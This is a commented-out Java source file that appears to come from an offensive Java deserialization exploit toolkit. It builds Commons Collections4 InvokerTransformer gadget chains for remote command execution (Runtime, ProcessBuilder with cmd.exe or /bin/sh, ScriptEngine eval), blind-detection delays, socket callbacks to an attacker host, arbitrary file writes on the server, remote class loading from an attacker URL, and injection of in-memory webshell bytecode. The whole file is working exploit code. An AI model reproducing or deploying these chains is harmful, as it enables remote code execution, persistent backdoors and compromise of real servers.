//package com.ppp.sinks;
//
//import com.ppp.JavaClassBuilder;
//import com.ppp.JavaClassHelper;
//import com.ppp.Printer;
//import com.ppp.sinks.annotation.EnchantEnums;
//import com.ppp.sinks.annotation.EnchantType;
//import com.ppp.sinks.annotation.Sink;
//import com.ppp.utils.maker.CryptoUtils;
//import org.apache.commons.collections4.Transformer;
//import org.apache.commons.collections4.functors.ConstantTransformer;
//import org.apache.commons.collections4.functors.InstantiateTransformer;
//import org.apache.commons.collections4.functors.InvokerTransformer;
//
//import javax.script.ScriptEngineManager;
//import java.io.FileInputStream;
//import java.io.FileOutputStream;
//import java.net.Socket;
//import java.net.URL;
//import java.net.URLClassLoader;
//import java.util.concurrent.TimeUnit;
//
///**
// * @author Whoopsunix
// */
//@Sink({Sink.InvokerTransformer4})
//public class InvokerTransformer4 {
//     /**
//     * 命令执行
//     *
//     * @param sinksHelper
//     * @return
//     */
//    @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
//    public Transformer[] runtime(SinksHelper sinksHelper) {
//        String command = sinksHelper.getCommand();
//        EnchantEnums commandType = sinksHelper.getCommandType();
//        EnchantEnums os = sinksHelper.getOs();
//        String code = sinksHelper.getCode();
//        String codeFile = sinksHelper.getCodeFile();
//
//        Printer.blueInfo("command type: " + commandType);
//        Printer.yellowInfo("command: " + command);
//
//        Transformer[] transformers = new Transformer[0];
//        switch (commandType) {
//            default:
//            case Runtime:
//                transformers = new Transformer[]{
//                        new ConstantTransformer(Runtime.class),
//                        new InvokerTransformer("getMethod", new Class[]{
//                                String.class, Class[].class}, new Object[]{
//                                "getRuntime", new Class[0]}),
//                        new InvokerTransformer("invoke", new Class[]{
//                                Object.class, Object[].class}, new Object[]{
//                                null, new Object[0]}),
//                        new InvokerTransformer("exec",
//                                new Class[]{String.class}, new Object[]{command}),
//                        new ConstantTransformer(1)};
//                break;
//
//            case ProcessBuilder:
//                if (os != null && os.equals(EnchantEnums.WIN)) {
//                    Printer.yellowInfo("os: " + os);
//                    transformers = new Transformer[]{
//                            new ConstantTransformer(ProcessBuilder.class),
//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
//                            new InvokerTransformer("newInstance", new Class[]{
//                                    Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
//                            new ConstantTransformer(1)};
//                } else {
//                    transformers = new Transformer[]{
//                            new ConstantTransformer(ProcessBuilder.class),
//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
//                            new InvokerTransformer("newInstance", new Class[]{
//                                    Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
//                            new ConstantTransformer(1)};
//                }
//                break;
//
//            case ScriptEngine:
//                if (codeFile != null) {
//                    try {
//                        FileInputStream fileInputStream = new FileInputStream(codeFile);
//                        byte[] codeBytes = new byte[fileInputStream.available()];
//                        fileInputStream.read(codeBytes);
//                        fileInputStream.close();
//                        code = new String(codeBytes);
//                    } catch (Exception e) {
//                        Printer.error("File read error");
//                    }
//                }
//                if (code == null) {
//                    code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
//                    Printer.blueInfo("use default code template: " + code);
//                }
//                // 模板替换 -cmd -> [ppp]
//                code = code.replaceAll("\\[ppp\\]", command);
//
//                Printer.yellowInfo(String.format("js code is: %s", code));
//
//                transformers = new Transformer[]{
//                        new ConstantTransformer(ScriptEngineManager.class),
//                        new InstantiateTransformer(new Class[]{}, new Object[]{}),
//                        new InvokerTransformer("getEngineByName", new Class[]{
//                                String.class}, new Object[]{"JavaScript"}),
//                        new InvokerTransformer("eval", new Class[]{
//                                String.class}, new Object[]{code}),
//                        new ConstantTransformer(1)};
//                break;
//        }
//
//        return transformers;
//    }
//
//    /**
//     * 线程延时
//     *
//     * @param sinksHelper
//     * @return
//     */
//    @EnchantType({EnchantType.Delay})
//    public Transformer[] delay(SinksHelper sinksHelper) {
//        EnchantEnums delay = sinksHelper.getDelay();
//        Long delayTime = sinksHelper.getDelayTime();
//
//        Printer.yellowInfo(String.format("System will delay response for %s seconds", delayTime));
//
//        Transformer[] transformers = null;
//        if (delay != null && delay.equals(EnchantEnums.Timeunit)) {
//            transformers = new Transformer[]{
//                    new ConstantTransformer(TimeUnit.class),
//                    new InvokerTransformer("getDeclaredField", new Class[]{
//                            String.class}, new Object[]{
//                            "SECONDS"}),
//                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
//                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
//                    new ConstantTransformer(1)};
//        } else {
//            delayTime = delayTime * 1000L;
//            transformers = new Transformer[]{
//                    new ConstantTransformer(Thread.class),
//                    new InvokerTransformer("getMethod", new Class[]{
//                            String.class, Class[].class}, new Object[]{
//                            "currentThread", null}),
//                    new InvokerTransformer("invoke", new Class[]{
//                            Object.class, Object[].class}, new Object[]{
//                            null, null}),
//                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
//                    new ConstantTransformer(1)};
//        }
//
//        return transformers;
//    }
//
//    /**
//     * Socket 探测
//     *
//     * @param sinksHelper
//     * @return
//     */
//    @EnchantType({EnchantType.Socket})
//    public Transformer[] socket(SinksHelper sinksHelper) {
//        String thost = sinksHelper.getHost();
//
//        Printer.yellowInfo("System will initiate a socket request to " + thost);
//
//        String[] hostSplit = thost.split("[:]");
//        String host = hostSplit[0];
//        int port = 80;
//        if (hostSplit.length == 2)
//            port = Integer.parseInt(hostSplit[1]);
//
//        return new Transformer[]{
//                new ConstantTransformer(Socket.class),
//                new InstantiateTransformer(new Class[]{String.class, int.class}, new Object[]{host, port}),
//                new ConstantTransformer(1)};
//    }
//
//    /**
//     * 文件写入
//     *
//     * @param sinksHelper
//     * @return
//     * @throws Exception
//     */
//    @EnchantType({EnchantType.FileWrite})
//    public Transformer[] fileWrite(SinksHelper sinksHelper) throws Exception {
//        String serverFilePath = sinksHelper.getServerFilePath();
//        String localFilePath = sinksHelper.getLocalFilePath();
//        String fileContent = sinksHelper.getFileContent();
//        Printer.yellowInfo("Server file path: " + serverFilePath);
//
//        byte[] contentBytes = new byte[]{};
//
//        if (localFilePath != null) {
//            Printer.yellowInfo("Local file path: " + localFilePath);
//            try {
//                FileInputStream fileInputStream = new FileInputStream(localFilePath);
//                contentBytes = new byte[fileInputStream.available()];
//                fileInputStream.read(contentBytes);
//                fileInputStream.close();
//            } catch (Exception e) {
//                Printer.error("File read error");
//            }
//        } else if (fileContent != null) {
//            contentBytes = fileContent.getBytes();
//        }
//
//        return new Transformer[]{
//                new ConstantTransformer(FileOutputStream.class),
//                new InstantiateTransformer(
//                        new Class[]{String.class},
//                        new Object[]{serverFilePath}
//                ),
//                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
//                new ConstantTransformer(1)};
//    }
//
//    /**
//     * 远程类加载
//     *
//     * @param sinksHelper
//     * @return
//     * @throws Exception
//     */
//    @EnchantType({EnchantType.RemoteLoad})
//    public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
//        String url = sinksHelper.getUrl();
//        String remoteClassName = sinksHelper.getRemoteClassName();
//        Object constructor = sinksHelper.getConstructor();
//
//        Printer.yellowInfo("Remote url: " + url);
//        Printer.yellowInfo("Remote class name: " + remoteClassName);
//
//        Transformer[] transformers;
//
//        // 构造方法
//        if (constructor != null) {
//            Printer.yellowInfo("Remote class constructor param: " + constructor);
//            // 转为 Integer
//            try {
//                constructor = Integer.parseInt(constructor.toString());
//            } catch (Exception e) {
//            }
//
//            Class constructorType = constructor.getClass();
//            Object args = constructor;
//
//            transformers = new Transformer[]{
//                    new ConstantTransformer(URLClassLoader.class),
//                    new InstantiateTransformer(
//                            new Class[]{URL[].class},
//                            new Object[]{new URL[]{new URL(url)}}
//                    ),
//                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
//                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{constructorType}}),
//                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
//                    new ConstantTransformer(1)};
//        } else {
//            // 默认 static 无参构造
//            transformers = new Transformer[]{
//                    new ConstantTransformer(URLClassLoader.class),
//                    new InstantiateTransformer(
//                            new Class[]{URL[].class},
//                            new Object[]{new URL[]{new URL(url)}}
//                    ),
//                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
//                    new InstantiateTransformer(null, null),
//                    new ConstantTransformer(1)};
//        }
//
//        return transformers;
//    }
//
//    /**
//     * 本地类加载
//     *
//     * @param sinksHelper
//     * @return
//     */
//    @EnchantType({EnchantType.LocalLoad})
//    public Transformer[] localLoad(SinksHelper sinksHelper) throws Exception {
//        EnchantEnums loadFunction = sinksHelper.getLoadFunction();
//
//        /**
//         * 字节码加载
//         */
//        byte[] classBytes = null;
//        String className = null;
//        // 内存马
//        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
//
//        if (javaClassHelper != null) {
//            classBytes = JavaClassBuilder.build(javaClassHelper);
//            className = javaClassHelper.getCLASSNAME();
//            System.out.println("Class Name: " + className);
//        }
//
//        if (classBytes == null) {
//            Printer.error("Miss classBytes");
//        }
//        if (className == null) {
//            Printer.error("Miss ClassName");
//        }
//
//        Transformer[] transformers;
//        if (loadFunction != null && loadFunction.equals(EnchantEnums.RHINO)) {
//            Printer.yellowInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
//            /**
//             * org.mozilla.javascript.DefiningClassLoader.defineClass()
//             * 需要 org.mozilla:rhino 依赖
//             */
//            transformers = new Transformer[]{
//                    new ConstantTransformer(Class.forName("org.mozilla.javascript.DefiningClassLoader")),
//                    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
//                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
//                    new InvokerTransformer("defineClass",
//                            new Class[]{String.class, byte[].class}, new Object[]{className, classBytes}),
//                    new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
//                    new ConstantTransformer(1)};
//        } else {
//            Printer.yellowInfo("Class load function is " + "javax.script.ScriptEngineManager");
//            /**
//             * javax.script.ScriptEngineManager
//             */
//            String b64 = CryptoUtils.base64encoder(classBytes);
//
//            String code = "var data=\"" + b64 + "\";\n" +
//                    "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
//                    "var object = aClass.newInstance();\n" +
//                    "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
//                    "var classLoader=new java.lang.ClassLoader() {};\n" +
//                    "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
//                    "defineClassMethod.setAccessible(true);\n" +
//                    "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
//                    "loadedClass.newInstance();";
//
//            transformers = new Transformer[]{
//                    new ConstantTransformer(ScriptEngineManager.class),
//                    new InstantiateTransformer(new Class[]{}, new Object[]{}),
//                    new InvokerTransformer("getEngineByName", new Class[]{
//                            String.class}, new Object[]{"JavaScript"}),
//                    new InvokerTransformer("eval", new Class[]{
//                            String.class}, new Object[]{code}),
//                    new ConstantTransformer(1)};
//        }
//
//        return transformers;
//    }
//}
